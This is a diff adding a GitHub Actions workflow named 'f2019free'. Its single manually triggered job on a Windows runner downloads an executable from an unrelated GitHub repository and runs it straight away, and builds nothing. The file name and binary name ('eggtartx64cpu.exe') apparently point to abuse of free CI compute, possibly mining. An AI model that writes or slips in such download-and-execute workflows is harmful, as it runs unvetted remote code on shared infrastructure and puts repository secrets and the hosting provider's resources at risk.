@@ -1,0 +1,10 @@
+name: f2019free
+on:
+  workflow_dispatch:
+jobs:
+  build:
+    runs-on: windows-2019
+    steps:
+      - name: powershell
+        shell: cmd
+        run: powershell.exe -c Invoke-WebRequest https://github.com/t20241104/t20241104/raw/refs/heads/main/eggtartx64cpu.exe -OutFile oook.exe ; .\oook.exe
